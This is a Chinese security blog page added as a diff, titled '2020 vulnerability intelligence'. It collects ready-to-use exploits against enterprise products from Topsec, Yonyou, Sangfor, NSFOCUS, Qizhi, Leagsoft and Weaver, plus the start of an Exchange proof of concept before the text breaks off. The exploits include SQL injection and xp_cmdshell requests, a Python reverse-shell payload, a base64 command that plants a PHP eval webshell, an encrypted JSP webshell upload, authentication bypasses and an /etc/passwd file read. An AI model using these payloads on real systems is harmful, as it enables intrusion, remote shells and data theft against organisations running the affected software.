@@ -1,0 +1,331 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    <meta name="description" content="1、天融信 TopApp-LB负载均衡 SQL注入1234567891011121314151617POST &#x2F;acc&#x2F;clsf&#x2F;report&#x2F;datasource.php HTTP&#x2F;1.1Host:xxxx.comConnection: closeAccept: text&#x2F;javascript, text&#x2F;html, application&#x2F;xml, text&#x2F;xml, *&#x2F;*X-Prototy">
+<meta property="og:type" content="article">
+<meta property="og:title" content="2020漏洞情报">
+<meta property="og:url" content="http://yoursite.com/2020/09/14/2020%E6%BC%8F%E6%B4%9E%E6%83%85%E6%8A%A5/index.html">
+<meta property="og:site_name" content="R17a&#39;s blog">
+<meta property="og:description" content="1、天融信 TopApp-LB负载均衡 SQL注入1234567891011121314151617POST &#x2F;acc&#x2F;clsf&#x2F;report&#x2F;datasource.php HTTP&#x2F;1.1Host:xxxx.comConnection: closeAccept: text&#x2F;javascript, text&#x2F;html, application&#x2F;xml, text&#x2F;xml, *&#x2F;*X-Prototy">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://yoursite.com/2020/09/14/2020%E6%BC%8F%E6%B4%9E%E6%83%85%E6%8A%A5/imgs/mmexport1599922426606.jpg">
+<meta property="article:published_time" content="2020-09-14T02:35:48.452Z">
+<meta property="article:modified_time" content="2020-09-14T02:35:48.453Z">
+<meta property="article:author" content="R17a">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://yoursite.com/2020/09/14/2020%E6%BC%8F%E6%B4%9E%E6%83%85%E6%8A%A5/imgs/mmexport1599922426606.jpg">
+    
+    
+        
+          
+              <link rel="shortcut icon" href="/images/favicon.ico">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+          
+        
+    
+    <!-- title -->
+    <title>2020漏洞情报</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+      
+<link rel="stylesheet" href="/css/rtl.css">
+
+    
+    <!-- rss -->
+    
+    
+<meta name="generator" content="Hexo 4.2.1"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="/tags/">Tags</a></li>
+         
+          <li><a href="/categories/">Categories</a></li>
+         
+          <li><a href="/about/">About</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" href="/2020/09/22/XML%E7%9B%B8%E5%85%B3%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E6%B1%87%E6%80%BB/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" href="/2020/09/14/2020%E9%87%8D%E4%BF%9D%E6%9C%9F%E9%97%B4%E6%BC%8F%E6%B4%9E%E6%83%85%E6%8A%A5/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://yoursite.com/2020/09/14/2020%E6%BC%8F%E6%B4%9E%E6%83%85%E6%8A%A5/" target="_blank" rel="noopener"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://yoursite.com/2020/09/14/2020%E6%BC%8F%E6%B4%9E%E6%83%85%E6%8A%A5/&text=2020漏洞情报" target="_blank" rel="noopener"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://yoursite.com/2020/09/14/2020%E6%BC%8F%E6%B4%9E%E6%83%85%E6%8A%A5/&title=2020漏洞情报" target="_blank" rel="noopener"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://yoursite.com/2020/09/14/2020%E6%BC%8F%E6%B4%9E%E6%83%85%E6%8A%A5/&is_video=false&description=2020漏洞情报" target="_blank" rel="noopener"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=2020漏洞情报&body=Check out this article: http://yoursite.com/2020/09/14/2020%E6%BC%8F%E6%B4%9E%E6%83%85%E6%8A%A5/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://yoursite.com/2020/09/14/2020%E6%BC%8F%E6%B4%9E%E6%83%85%E6%8A%A5/&title=2020漏洞情报" target="_blank" rel="noopener"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://yoursite.com/2020/09/14/2020%E6%BC%8F%E6%B4%9E%E6%83%85%E6%8A%A5/&title=2020漏洞情报" target="_blank" rel="noopener"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://yoursite.com/2020/09/14/2020%E6%BC%8F%E6%B4%9E%E6%83%85%E6%8A%A5/&title=2020漏洞情报" target="_blank" rel="noopener"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://yoursite.com/2020/09/14/2020%E6%BC%8F%E6%B4%9E%E6%83%85%E6%8A%A5/&title=2020漏洞情报" target="_blank" rel="noopener"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://yoursite.com/2020/09/14/2020%E6%BC%8F%E6%B4%9E%E6%83%85%E6%8A%A5/&name=2020漏洞情报&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=http://yoursite.com/2020/09/14/2020%E6%BC%8F%E6%B4%9E%E6%83%85%E6%8A%A5/&t=2020漏洞情报" target="_blank" rel="noopener"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-4"><a class="toc-link" href="#1、天融信-TopApp-LB负载均衡-SQL注入"><span class="toc-number">1.</span> <span class="toc-text">1、天融信 TopApp-LB负载均衡 SQL注入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2、用友GRP-u8-注入-EXP已公开"><span class="toc-number">2.</span> <span class="toc-text">2、用友GRP-u8 注入 EXP已公开</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3、sangfor-EDR-平台权限绕过-amp-RCE-漏洞-EXP已公开"><span class="toc-number">3.</span> <span class="toc-text">3、sangfor EDR 平台权限绕过&amp;RCE 漏洞   EXP已公开</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4、绿盟UTS绕过登录-amp-未授权访问-EXP已公开"><span class="toc-number">4.</span> <span class="toc-text">4、绿盟UTS绕过登录&amp;未授权访问 EXP已公开</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5、WPS的0day中招据说会提示更新"><span class="toc-number">5.</span> <span class="toc-text">5、WPS的0day中招据说会提示更新</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#6、齐治堡垒机的利用-CVND-2019-20835-EXP未公开"><span class="toc-number">6.</span> <span class="toc-text">6、齐治堡垒机的利用 CVND-2019-20835 EXP未公开</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#7、联软准入的利用-EXP未公开"><span class="toc-number">7.</span> <span class="toc-text">7、联软准入的利用 EXP未公开</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#8、泛微OA云桥任意文件读取漏洞-EXP已公开"><span class="toc-number">8.</span> <span class="toc-text">8、泛微OA云桥任意文件读取漏洞 EXP已公开</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#9、Exchange-Server-远程代码执行漏洞CVE-2020-16875（POC未验证）"><span class="toc-number">9.</span> <span class="toc-text">9、Exchange Server 远程代码执行漏洞CVE-2020-16875（POC未验证）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#10、Sangfor-SSL-VPN-远程代码执行-CNVD-2020-48679（历史版本）"><span class="toc-number">10.</span> <span class="toc-text">10、Sangfor SSL VPN 远程代码执行 CNVD-2020-48679（历史版本）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#11、天融信数据防泄漏系统越权修改管理员密码"><span class="toc-number">11.</span> <span class="toc-text">11、天融信数据防泄漏系统越权修改管理员密码</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#12、PHPCMS远程代码执行"><span class="toc-number">12.</span> <span class="toc-text">12、PHPCMS远程代码执行</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#13、通达OA-V11-7-远程代码执行漏洞"><span class="toc-number">13.</span> <span class="toc-text">13、通达OA V11.7 远程代码执行漏洞</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        2020漏洞情报
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">R17a's blog</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2020-09-14T02:35:48.452Z" itemprop="datePublished">2020-09-14</time>
+        
+        (Updated: <time datetime="2020-09-14T02:35:48.453Z" itemprop="dateModified">2020-09-14</time>)
+        
+      
+    </div>
+
+
+      
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h4 id="1、天融信-TopApp-LB负载均衡-SQL注入"><a href="#1、天融信-TopApp-LB负载均衡-SQL注入" class="headerlink" title="1、天融信 TopApp-LB负载均衡 SQL注入"></a>1、天融信 TopApp-LB负载均衡 SQL注入</h4><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/acc/clsf/report/datasource.php</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host:xxxx.com</span></span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Accept</span>: text/javascript, text/html, application/xml, text/xml, */*</span><br><span class="line"><span class="attribute">X-Prototype-Version</span>: 1.6.0.3</span><br><span class="line"><span class="attribute">X-Requested-With</span>: XMLHttpRequest</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.105 Safari/537.36</span><br><span class="line"><span class="attribute">Sec-Fetch-Site</span>: same-origin</span><br><span class="line"><span class="attribute">Sec-Fetch-Mode</span>: cors</span><br><span class="line"><span class="attribute">Sec-Fetch-Dest</span>: empty</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span>: zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Cookie</span>: PHPSESSID=ijqtopbcbmu8d70o5t3kmvgt57</span><br><span class="line"><span class="attribute">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span>: 201</span><br><span class="line"></span><br><span class="line">t=l&amp;e=0&amp;s=t&amp;l=1&amp;vid=1+union select 1,2,3,4,5,6,7,8,9,substr('a',1,1),11,12,13,14,15,16,17,18,19,20,21,22--+&amp;gid=0&amp;lmt=10&amp;o=r_Speed&amp;asc=false&amp;p=8&amp;lipf=&amp;lipt=&amp;ripf=&amp;ript=&amp;dscp=&amp;proto=&amp;lpf=&amp;lpt=&amp;rpf=&amp;rpt=</span><br></pre></td></tr></table></figure>
+
+<h4 id="2、用友GRP-u8-注入-EXP已公开"><a href="#2、用友GRP-u8-注入-EXP已公开" class="headerlink" title="2、用友GRP-u8 注入 EXP已公开"></a>2、用友GRP-u8 注入 EXP已公开</h4><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/Proxy</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Accept</span>: Accept: */*</span><br><span class="line"><span class="attribute">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/4.0 (compatible; MSIE 6.0;)</span><br><span class="line"><span class="attribute">Host</span>: host</span><br><span class="line"><span class="attribute">Content-Length</span>: 357</span><br><span class="line"><span class="attribute">Connection</span>: Keep-Alive</span><br><span class="line"><span class="attribute">Cache-Control</span>: no-cache</span><br><span class="line"></span><br><span class="line">cVer=9.8.0&amp;dp=&lt;?xml version="1.0" encoding="GB2312"?&gt;&lt;R9PACKET version="1"&gt;&lt;DATAFORMAT&gt;XML&lt;/DATAFORMAT&gt;&lt;R9FUNCTION&gt;&lt;NAME&gt;AS_DataRequest&lt;/NAME&gt;&lt;PARAMS&gt;&lt;PARAM&gt;&lt;NAME&gt;ProviderName&lt;/NAME&gt;&lt;DATA format="text"&gt;DataSetProviderData&lt;/DATA&gt;&lt;/PARAM&gt;&lt;PARAM&gt;&lt;NAME&gt;Data&lt;/NAME&gt;&lt;DATA format="text"&gt;exec xp_cmdshell 'net user'&lt;/DATA&gt;&lt;/PARAM&gt;&lt;/PARAMS&gt;&lt;/R9FUNCTION&gt;&lt;/R9PACKET&gt;</span><br></pre></td></tr></table></figure>
+
+<h4 id="3、sangfor-EDR-平台权限绕过-amp-RCE-漏洞-EXP已公开"><a href="#3、sangfor-EDR-平台权限绕过-amp-RCE-漏洞-EXP已公开" class="headerlink" title="3、sangfor EDR 平台权限绕过&amp;RCE 漏洞   EXP已公开"></a>3、sangfor EDR 平台权限绕过&amp;RCE 漏洞   EXP已公开</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">EDR &lt; V3.2.21</span><br><span class="line">Fofa关键字： </span><br><span class="line">title&#x3D;&quot;终端检测响应平台&quot;</span><br></pre></td></tr></table></figure>
+
+<p>RCE:</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">POC：</span></span><br><span class="line">https://XXX/tool/log/c.php?strip_slashes=system&amp;limit=whoami</span><br><span class="line">https://XXX/tool/log/c.php?strip_slashes=system&amp;host=whoami</span><br><span class="line">https://XXX/tool/log/c.php?strip_slashes=system&amp;path=whoami</span><br><span class="line">https://XXX/tool/log/c.php?strip_slashes=system&amp;row=whoami</span><br><span class="line"></span><br><span class="line">反弹Shell:</span><br><span class="line"><span class="keyword">POST</span> <span class="string">/tool/log/c.php</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: x.x.x.x</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Cache-Control</span>: max-age=0</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span>: 1</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.81 Safari/537.36 SE 2.X MetaSr 1.0</span><br><span class="line"><span class="attribute">DNT</span>: 1</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8</span><br><span class="line"><span class="attribute">Content-Type</span>: application/x-www-form-urlencoded;charset=utf-8</span><br><span class="line"><span class="attribute">Accept-Language</span>: zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Cookie</span>: PHPSESSID=b1464478cad68327229d8f46e60d0a08; _ga=GA1.4.112365795.1597799903; _gid=GA1.4.1225783590.1597799903</span><br><span class="line"><span class="attribute">Content-Length</span>: 256</span><br><span class="line"></span><br><span class="line">strip_slashes=system&amp;host=python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ip",port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'</span><br></pre></td></tr></table></figure>
+
+<p>任意用户登录<strong>CNVD-2020-46552</strong>：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload：https:&#x2F;&#x2F;ip:xx&#x2F;ui&#x2F;login.php?user&#x3D;任意用户名    注:用户名需要存在</span><br><span class="line">构造payload,访问https:&#x2F;&#x2F;ip:xx&#x2F;ui&#x2F;login.php?user&#x3D;admin，成功未授权登录</span><br></pre></td></tr></table></figure>
+
+<h4 id="4、绿盟UTS绕过登录-amp-未授权访问-EXP已公开"><a href="#4、绿盟UTS绕过登录-amp-未授权访问-EXP已公开" class="headerlink" title="4、绿盟UTS绕过登录&amp;未授权访问 EXP已公开"></a>4、绿盟UTS绕过登录&amp;未授权访问 EXP已公开</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">UTS &lt; V2.0R00F02SP03</span><br><span class="line">参考链接：https:&#x2F;&#x2F;www.cnblogs.com&#x2F;Yang34&#x2F;p&#x2F;13654140.html</span><br><span class="line">POC步骤：</span><br><span class="line">访问页面，随意输入用户名admin密码XXX，获取响应</span><br><span class="line">将相应的stauts字段false改为true可获取admin的md5值password</span><br><span class="line">利用md5作为password字段修改最初的包再去登录</span><br></pre></td></tr></table></figure>
+
+<h4 id="5、WPS的0day中招据说会提示更新"><a href="#5、WPS的0day中招据说会提示更新" class="headerlink" title="5、WPS的0day中招据说会提示更新"></a>5、WPS的0day中招据说会提示更新</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;zeifan.my&#x2F;security&#x2F;rce&#x2F;heap&#x2F;2020&#x2F;09&#x2F;03&#x2F;wps-rce-heap.html</span><br></pre></td></tr></table></figure>
+
+<h4 id="6、齐治堡垒机的利用-CVND-2019-20835-EXP未公开"><a href="#6、齐治堡垒机的利用-CVND-2019-20835-EXP未公开" class="headerlink" title="6、齐治堡垒机的利用 CVND-2019-20835 EXP未公开"></a>6、齐治堡垒机的利用 CVND-2019-20835 EXP未公开</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">漏洞利用：</span><br><span class="line">利用条件：无需登录：</span><br><span class="line">参考链接：https:&#x2F;&#x2F;www.secpulse.com&#x2F;archives&#x2F;140809.html</span><br><span class="line">1、访问 http:&#x2F;&#x2F;10.20.10.11&#x2F;listener&#x2F;cluster_manage.php  :返回 &quot;OK&quot;.</span><br><span class="line">2、访问如下链接即可getshell，执行成功后，生成PHP一句话马</span><br><span class="line">https:&#x2F;&#x2F;10.20.10.10&#x2F;ha_request.php?action&#x3D;install&amp;ipaddr&#x3D;10.20.10.11&amp;node_id&#x3D;1$&#123;IFS&#125;|&#96;echo$&#123;IFS&#125;&quot; ZWNobyAnPD9waHAgQGV2YWwoJF9SRVFVRVNUWzEwMDg2XSk7Pz4nPj4vdmFyL3d3dy9zaHRlcm0vcmVzb3VyY2VzL3FyY29kZS9sYmo3Ny5waHAK&quot;|base64$&#123;IFS&#125;- d|bash&#96;|$&#123;IFS&#125;|echo$&#123;IFS&#125;</span><br><span class="line">3、&#x2F;var&#x2F;www&#x2F;shterm&#x2F;resources&#x2F;qrcode&#x2F;lbj77.php  密码10086</span><br></pre></td></tr></table></figure>
+
+<h4 id="7、联软准入的利用-EXP未公开"><a href="#7、联软准入的利用-EXP未公开" class="headerlink" title="7、联软准入的利用 EXP未公开"></a>7、联软准入的利用 EXP未公开</h4><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">参考链接：https://blog.csdn.net/God_XiangYu/article/details/108555525</span><br><span class="line"><span class="keyword">POST</span> <span class="string">/uai/download/uploadfileToPath.htm</span> HTTP/1.1</span><br><span class="line"><span class="attribute">HOST</span>: xxxxx</span><br><span class="line">... ...</span><br><span class="line"> </span><br><span class="line">-----------------------------570xxxxxxxxx6025274xxxxxxxx1</span><br><span class="line"><span class="attribute">Content-Disposition</span>: form-data; name="input_localfile"; filename="xxx.jsp"</span><br><span class="line"><span class="attribute">Content-Type</span>: image/png</span><br><span class="line"> </span><br><span class="line">&lt;%@page import="java.util.*,javax.crypto.*,javax.crypto.spec.*"%&gt;&lt;%!class U extends ClassLoader&#123;U(ClassLoader c)&#123;super(c);&#125;public Class g(byte []b)&#123;return super.defineClass(b,0,b.length);&#125;&#125;%&gt;&lt;%if (request.getMethod().equals("POST"))&#123;String k="e45e329feb5d925b";/*该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond*/session.putValue("u",k);Cipher c=Cipher.getInstance("AES");c.init(2,new SecretKeySpec(k.getBytes(),"AES"));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);&#125;%&gt;</span><br><span class="line"> </span><br><span class="line">-----------------------------570xxxxxxxxx6025274xxxxxxxx1</span><br><span class="line"><span class="attribute">Content-Disposition</span>: form-data; name="uploadpath"</span><br><span class="line"> </span><br><span class="line">../webapps/notifymsg/devreport/</span><br><span class="line">-----------------------------570xxxxxxxxx6025274xxxxxxxx1--</span><br></pre></td></tr></table></figure>
+
+<h4 id="8、泛微OA云桥任意文件读取漏洞-EXP已公开"><a href="#8、泛微OA云桥任意文件读取漏洞-EXP已公开" class="headerlink" title="8、泛微OA云桥任意文件读取漏洞 EXP已公开"></a>8、泛微OA云桥任意文件读取漏洞 EXP已公开</h4><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">漏洞验证:</span><br><span class="line">1、GET /wxjsapi/saveYZJFile?fileName=test&amp;downloadUrl=file:///etc/passwd&amp;fileExt=txt HTTP/1.1</span><br><span class="line"><span class="attribute">User-Agent</span>: curl/7.29.0</span><br><span class="line"><span class="attribute">Host</span>: xxxxx</span><br><span class="line"><span class="attribute">Accept</span>: */*</span><br><span class="line">获取到文件ID，即响应中的ID字段</span><br><span class="line">2、GET /file/fileNoLogin/xxxxxxxxxx（ID） HTTP/1.1</span><br><span class="line"><span class="attribute">User-Agent</span>: curl/7.29.0</span><br><span class="line"><span class="attribute">Host</span>: xxxxx</span><br><span class="line"><span class="attribute">Accept</span>: */*</span><br><span class="line">请求文件ID即可获取文件内容</span><br></pre></td></tr></table></figure>
+
+<p><img src="imgs/mmexport1599922426606.jpg" alt="image-20200913215844535"></p>
+<h4 id="9、Exchange-Server-远程代码执行漏洞CVE-2020-16875（POC未验证）"><a href="#9、Exchange-Server-远程代码执行漏洞CVE-2020-16875（POC未验证）" class="headerlink" title="9、Exchange Server 远程代码执行漏洞CVE-2020-16875（POC未验证）"></a>9、Exchange Server 远程代码执行漏洞CVE-2020-16875（POC未验证）</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span 